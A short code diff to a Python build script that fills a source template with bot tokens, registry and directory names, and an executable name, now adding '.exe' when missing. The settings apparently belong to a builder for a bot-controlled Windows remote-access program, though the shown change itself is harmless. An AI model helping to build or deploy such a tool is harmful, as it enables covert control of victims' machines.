@@ -27,7 +27,11 @@ def compile():
             if line.startswith('bot_tokens'): edit_source_code.write('bot_tokens = [\'' + config['SETTINGS']['bot_token_1'] + (('\', \'' + config['SETTINGS']['bot_token_2']) if config['SETTINGS']['bot_token_2'] != '' else '') + (('\', \'' + config['SETTINGS']['bot_token_3']) if config['SETTINGS']['bot_token_3'] != '' else '') + '\']\n')
             elif line.startswith('software_registry_name'): edit_source_code.write('software_registry_name = \'' + config['SETTINGS']['registry_name'] + '\'\n')
             elif line.startswith('software_directory_name'): edit_source_code.write('software_directory_name = \'' + config['SETTINGS']['directory_name'] + '\'\n')
-            elif line.startswith('software_executable_name'): edit_source_code.write('software_executable_name = \'' + config['SETTINGS']['executable_name'] + '\'\n')
+            elif line.startswith('software_executable_name'): 
+                if config['SETTINGS']['executable_name'].endswith('.exe'):
+                    edit_source_code.write('software_executable_name = \'' + config['SETTINGS']['executable_name'] + '\'\n')
+                else:
+                    edit_source_code.write('software_executable_name = \'' + config['SETTINGS']['executable_name'] + '.exe' + '\'\n')
             elif line.startswith('    \'info\':'): edit_source_code.write('    \'info\': True,\n')
             elif line.startswith('    \'main\':'): edit_source_code.write('    \'main\': True,\n')
             elif line.startswith('    \'spam\':'): edit_source_code.write('    \'spam\': ' + config['SETTINGS']['spam_channel'] + ',\n')
